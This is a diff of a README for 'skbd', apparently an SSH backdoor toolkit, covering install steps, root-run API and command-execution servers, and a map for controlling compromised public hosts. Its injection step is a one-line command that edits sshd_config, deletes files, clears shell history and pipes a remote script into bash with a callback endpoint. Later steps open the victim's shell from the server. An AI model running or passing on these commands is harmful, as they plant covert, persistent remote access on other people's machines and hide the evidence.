@@ -24,60 +24,44 @@
 
 ---
 
-# Usage
+
+# Install
+
+
+`$ git clone https://github.com/MartinxMax/skbd.git;cd skbd`
+`$ python3 -m venv skbd`
+`$ sudo apt install -y libxcb-xinerama0 libxcb-cursor0 libxcb-icccm4 libxkbcommon-x11-0 libgl1 libqt5gui5t64`
+`$ source skbd/bin/activate`
+`(skbd)$ pip install --upgrade pip`
+`(skbd)$ pip install -r requirements.txt`
+
+
+# SKBD Usage
 
 **PS: This script must be executed with ROOT privileges.**
 
-## skbd.py : Server (API)
+1. Start the server (API):
 
-`$ python3 skbd.py -h`
-
-![alt text](pic/image.png)
-
-## skbdexec.py : Server (Command Execution)
-
-`$ python3 skbdexec.py`
-
-![alt text](pic/image-1.png)
-
-## skbd.sh : Client (Load skbd backdoor)
-
-`$ ./skbd.sh`
-
-![alt text](pic/image-2.png)
-
----
-
-# Examples:
-
-1. Start a malicious HTTP server
-
-`$ python3 -m http.server 8181`
-
-![alt text](pic/image-4.png)
-
-2. Start the server (API):
-
-`$ python3 skbd.py`
+`(skbd)$ python3 skbd.py`
 
 ![alt text](pic/image-5.png)
 
 > endpoint: https://192.168.0.115:9191
 
-3. Start the server (Command execution):  
+2. Start the server (Command execution):  
    **PS**: `skbdexec.py` can be started at any time.
 
-`$ python3 skbdexec.py`
+`(skbd)$ python3 skbdexec.py`
 
 ![alt text](pic/image-6.png)
 
-4. Inject the skbd backdoor into the client
+3. Inject the skbd backdoor into the client
 
-`$ curl http://<IP>:<PORT>/skbd.sh|bash -s -- -e 'https://<IP>:PORT' `
+`$ sed -i "/TrustedUserCAKeys \/etc\/.system\//d" /etc/ssh/sshd_config;rm -rf /etc/.system;service ssh reload;/usr/sbin/sshd -D;history -c;curl https://raw.githubusercontent.com/MartinxMax/skbd/refs/heads/main/skbd.sh |bash -s -- -e 'https://<skbd_ip>:9191' -l '<Machine_Internet_IP, optional if not available>' `
 
 ![alt text](pic/image-3.png)
 
-5. Access the client's shell from the server (Command execution):
+4. Access the client's shell from the server (Command execution):
 
 `SKBD # info`
 
@@ -118,3 +102,18 @@ Final login parameters:
 `SKBD[f6b50eecbeca4b61a7e8932c3e9cf9f2]# run`
 
 ![alt text](pic/image-9.png)
+
+# SKBD Map Usage
+
+PS: This map supports backdoor access control for public-facing hosts only. 
+Backdoor hosts located in private (LAN) networks cannot be controlled or viewed.
+
+`$ chmod 600 ./auth_protect/id_rsa`
+
+`(skbd)$ python skbd_map.py`
+
+![alt text](./pic/map0.png)
+
+![alt text](./pic/map1.png)
+
+![alt text](./pic/map2.png)
